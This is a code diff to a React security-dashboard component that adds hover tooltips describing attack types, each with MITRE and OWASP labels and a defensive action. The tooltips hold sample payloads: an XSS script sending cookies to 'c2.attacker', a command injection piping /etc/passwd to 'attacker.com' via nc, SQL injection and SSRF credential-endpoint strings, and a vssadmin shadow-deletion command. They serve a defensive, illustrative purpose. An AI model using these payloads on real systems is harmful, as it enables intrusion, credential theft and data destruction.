@@ -4,7 +4,6 @@ import React, { useState, useEffect, useMemo, useRef } from 'react';
 
 /**
  * Web Audio Synthesizer for Tactical SOC Audio Feedback
- * Synthesizes clean, high-tech interface sounds without external audio assets.
  */
 function playTactileSound(type = 'click') {
   if (typeof window === 'undefined') return;
@@ -51,12 +50,90 @@ function playTactileSound(type = 'click') {
   }
 }
 
-/**
- * NeuralThreatMeshGraphic Component
- * Next-Gen realistic Cyber Neural Mesh & Threat Topology visualizer.
- * Supports fullScreen mode fitting 100vh viewports with expanded canvas,
- * Web Audio feedback, live HTML5 oscilloscope waveform canvas, and CRT scanlines.
- */
+// Rich Interactive Tooltip Knowledge Base for Hover Details
+const TOOLTIP_DETAILS = {
+  'zero-trust': {
+    title: '🛡️ Zero-Trust Hardened Isolation',
+    tag: 'POLICY // STRICT KERNEL ENFORCEMENT',
+    desc: 'Sub-50ms automated packet dropping at the Linux kernel firewall level (iptables/ipset). Immediately severs TCP sessions upon high-threat anomaly detection.',
+    mttm: '< 0.05s MTTM',
+    sla: '99.999% Zero-Bypass SLA',
+    color: '#00d4ff'
+  },
+  'adaptive-ai': {
+    title: '🧠 Neural Heuristic Baseline Engine',
+    tag: 'ANOMALY MODEL // RECURRENT SHANNON ENTROPY',
+    desc: 'Evaluates real-time packet byte randomness H(X) and statistical Z-score deviations to detect uncataloged zero-day exploits and obfuscated payloads.',
+    mttm: '< 0.28s MTTM',
+    sla: 'Zero-Day Detection Active',
+    color: '#a855f7'
+  },
+  'honeypot': {
+    title: '🍯 Active Deception & Sandbox Trapping',
+    tag: 'HONEYPOT // ACTIVE DECEPTION MATRIX',
+    desc: 'Silently proxies malicious sessions into an isolated Docker sandbox environment to record TTPs and payload forensics without alerting the adversary.',
+    mttm: 'Real-Time Routing',
+    sla: '100% Forensic Isolation',
+    color: '#f59e0b'
+  },
+  'SQL Injection': {
+    mitre: 'MITRE T1190: Exploit Public-Facing Application',
+    owasp: 'OWASP A03:2021-Injection',
+    desc: 'Malicious SQL fragments injected into HTTP parameters to bypass auth or dump backend database tables.',
+    sample: "SELECT * FROM users WHERE id = '1' UNION SELECT 1, @@version, user()--",
+    action: 'Kernel WAF Regex Block + IP Token Bucket Rate Limiter',
+    color: '#00d4ff'
+  },
+  'Cross-Site Scripting': {
+    mitre: 'MITRE T1059.007: JavaScript Scripting',
+    owasp: 'OWASP A03:2021-Injection',
+    desc: 'Client-side script execution vector attempting DOM manipulation or session cookie hijacking.',
+    sample: "<script>document.location='http://c2.attacker/steal?cookie='+document.cookie</script>",
+    action: 'HTML Entity Sanitization + Strict CSP Header Enforcement',
+    color: '#00d4ff'
+  },
+  'SSRF Payload': {
+    mitre: 'MITRE T1090: Proxy & Server-Side Relaying',
+    owasp: 'OWASP A10:2021-SSRF',
+    desc: 'Forces server-side engine to make unauthorized requests to internal cloud metadata endpoints.',
+    sample: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    action: 'Egress Metadata IP Blacklist + IAM Token Proxying',
+    color: '#00d4ff'
+  },
+  'Command Injection': {
+    mitre: 'MITRE T1059.004: Unix Shell Execution',
+    owasp: 'OWASP A03:2021-Injection',
+    desc: 'Injects arbitrary OS shell commands into unescaped system process execution calls.',
+    sample: "; cat /etc/passwd | nc attacker.com 4444",
+    action: 'POSIX Pipe Sanitization + Process Sandbox Isolation',
+    color: '#00d4ff'
+  },
+  'GraphQL Abuse': {
+    mitre: 'MITRE T1190: API Endpoint Abuse',
+    owasp: 'OWASP API8:2023-Security Misconfiguration',
+    desc: 'Recursive introspection query abuse seeking hidden schema fields or causing GraphQL CPU exhaustion.',
+    sample: "query { __schema { types { name fields { name } } } }",
+    action: 'Introspection Query Block + Maximum Depth Limiter',
+    color: '#00d4ff'
+  },
+  'SYN Flood': {
+    mitre: 'MITRE T1498.001: Direct Network Flood',
+    owasp: 'DDoS Infrastructure Attack',
+    desc: 'High-volume TCP SYN packet wave attempting to exhaust kernel connection queue tables.',
+    sample: "TCP SYN Flood (100,000 pps with spoofed source IPs)",
+    action: 'SYN Cookies + eBPF Kernel Rate Limiting',
+    color: '#f59e0b'
+  },
+  'LockBit Encryptor': {
+    mitre: 'MITRE T1486: Data Encrypted for Impact',
+    owasp: 'Ransomware Execution',
+    desc: 'Automated file system encryption wave combined with VSS shadow copy deletion routines.',
+    sample: "AES-256 batch encryption + vssadmin delete shadows /all /quiet",
+    action: 'Entropy Spike H(X)>7.5 Block + Immediate Process Freeze',
+    color: '#ef4444'
+  },
+};
+
 export default function NeuralThreatMeshGraphic({
   alertStats = {},
   ipsStats = {},
@@ -69,8 +146,8 @@ export default function NeuralThreatMeshGraphic({
   const [activePulse, setActivePulse] = useState(0);
   const [soundMuted, setSoundMuted] = useState(false);
   const [hudFilterActive, setHudFilterActive] = useState(true);
+  const [activeHoverDetail, setActiveHoverDetail] = useState(null);
 
-  // Live Jitter Metrics for Ultra-Realism
   const [liveMetrics, setLiveMetrics] = useState({
     throughput: 52400,
     latency: 0.38,
@@ -296,7 +373,7 @@ export default function NeuralThreatMeshGraphic({
             </span>
           </div>
           <div style={{ fontSize: fullScreen ? '0.82rem' : '0.74rem', color: '#94a3b8', marginTop: 4 }}>
-            Sub-Second Multi-Vector Correlation Mesh · Live Waveform Oscilloscope & Web Audio Enabled
+            Sub-Second Multi-Vector Correlation Mesh · Hover any button or threat signature for live telemetry details
           </div>
         </div>
 
@@ -340,6 +417,7 @@ export default function NeuralThreatMeshGraphic({
             {hudFilterActive ? '📺 HUD CRT ON' : '📺 HUD CRT OFF'}
           </button>
 
+          {/* Interactive Defense Mode Switcher Buttons */}
           <div style={{ display: 'flex', alignItems: 'center', gap: 4, background: 'rgba(6, 13, 24, 0.9)', padding: '4px', borderRadius: 10, border: '1px solid rgba(255, 255, 255, 0.1)' }}>
             {[
               { id: 'zero-trust', label: '🛡️ Zero-Trust', color: '#00d4ff' },
@@ -352,6 +430,8 @@ export default function NeuralThreatMeshGraphic({
                   setDefenseMode(m.id);
                   triggerSound('mode');
                 }}
+                onMouseEnter={() => setActiveHoverDetail(m.id)}
+                onMouseLeave={() => setActiveHoverDetail(null)}
                 style={{
                   padding: '7px 14px',
                   borderRadius: 7,
@@ -361,6 +441,7 @@ export default function NeuralThreatMeshGraphic({
                   fontSize: '0.75rem',
                   fontWeight: 800,
                   cursor: 'pointer',
+                  transition: 'all 0.2s ease',
                 }}
               >
                 {m.label}
@@ -574,23 +655,27 @@ export default function NeuralThreatMeshGraphic({
             </div>
           </div>
 
-          {/* Monitored Signatures */}
+          {/* Monitored Signatures Badges with Interactive Hover Tooltips */}
           <div>
             <div style={{ fontSize: '0.72rem', fontWeight: 800, color: '#94a3b8', textTransform: 'uppercase', marginBottom: 8 }}>
-              Active Vector Attack Signatures ({activeVectorData.threats.length})
+              Active Vector Attack Signatures (Hover for Details)
             </div>
             <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
               {activeVectorData.threats.map((t, idx) => (
                 <span
                   key={idx}
+                  onMouseEnter={() => setActiveHoverDetail(t)}
+                  onMouseLeave={() => setActiveHoverDetail(null)}
                   style={{
                     fontSize: '0.72rem',
-                    padding: '4px 10px',
+                    padding: '5px 12px',
                     borderRadius: 6,
-                    background: 'rgba(255, 255, 255, 0.05)',
-                    border: '1px solid rgba(255, 255, 255, 0.12)',
-                    color: '#e2e8f0',
+                    background: activeHoverDetail === t ? `${activeVectorData.color}33` : 'rgba(255, 255, 255, 0.05)',
+                    border: activeHoverDetail === t ? `1px solid ${activeVectorData.color}` : '1px solid rgba(255, 255, 255, 0.12)',
+                    color: activeHoverDetail === t ? activeVectorData.color : '#e2e8f0',
                     fontFamily: 'monospace',
+                    cursor: 'pointer',
+                    transition: 'all 0.2s ease',
                   }}
                 >
                   ⚡ {t}
@@ -625,6 +710,54 @@ export default function NeuralThreatMeshGraphic({
           </div>
         </div>
       </div>
+
+      {/* RICH INTERACTIVE HOVER TOOLTIP MODAL OVERLAY */}
+      {activeHoverDetail && TOOLTIP_DETAILS[activeHoverDetail] && (
+        <div
+          style={{
+            position: 'relative',
+            marginTop: 18,
+            zIndex: 40,
+            padding: '16px 20px',
+            borderRadius: 12,
+            background: 'rgba(6, 13, 24, 0.98)',
+            border: `1.5px solid ${TOOLTIP_DETAILS[activeHoverDetail].color || modeTheme.color}`,
+            boxShadow: `0 12px 35px rgba(0,0,0,0.9), 0 0 25px ${(TOOLTIP_DETAILS[activeHoverDetail].color || modeTheme.color)}44`,
+            animation: 'fadeIn 0.2s ease',
+          }}
+        >
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
+            <div style={{ fontSize: '0.92rem', fontWeight: 900, color: TOOLTIP_DETAILS[activeHoverDetail].color || modeTheme.color, display: 'flex', alignItems: 'center', gap: 8 }}>
+              {TOOLTIP_DETAILS[activeHoverDetail].title || `⚡ ${activeHoverDetail}`}
+              <span style={{ fontSize: '0.62rem', padding: '2px 6px', borderRadius: 4, background: 'rgba(255,255,255,0.08)', color: '#94a3b8', fontFamily: 'monospace' }}>
+                {TOOLTIP_DETAILS[activeHoverDetail].tag || TOOLTIP_DETAILS[activeHoverDetail].mitre || 'DISSECTION DETAILED'}
+              </span>
+            </div>
+            {TOOLTIP_DETAILS[activeHoverDetail].mttm && (
+              <span style={{ fontSize: '0.72rem', fontWeight: 800, color: '#10b981', fontFamily: 'monospace' }}>
+                {TOOLTIP_DETAILS[activeHoverDetail].mttm} · {TOOLTIP_DETAILS[activeHoverDetail].sla}
+              </span>
+            )}
+          </div>
+
+          <div style={{ fontSize: '0.78rem', color: '#cbd5e1', marginBottom: 8, lineHeight: 1.4 }}>
+            {TOOLTIP_DETAILS[activeHoverDetail].desc}
+          </div>
+
+          {TOOLTIP_DETAILS[activeHoverDetail].sample && (
+            <div style={{ fontSize: '0.7rem', background: '#020610', padding: '8px 12px', borderRadius: 6, border: '1px solid rgba(255,255,255,0.08)', fontFamily: 'monospace', color: '#00d4ff', marginBottom: 6 }}>
+              <span style={{ color: '#94a3b8', fontWeight: 700 }}>SAMPLE PAYLOAD: </span>
+              {TOOLTIP_DETAILS[activeHoverDetail].sample}
+            </div>
+          )}
+
+          {TOOLTIP_DETAILS[activeHoverDetail].action && (
+            <div style={{ fontSize: '0.7rem', color: '#10b981', fontFamily: 'monospace', fontWeight: 700 }}>
+              ✓ AUTOMATED ACTION: {TOOLTIP_DETAILS[activeHoverDetail].action}
+            </div>
+          )}
+        </div>
+      )}
     </div>
   );
 }
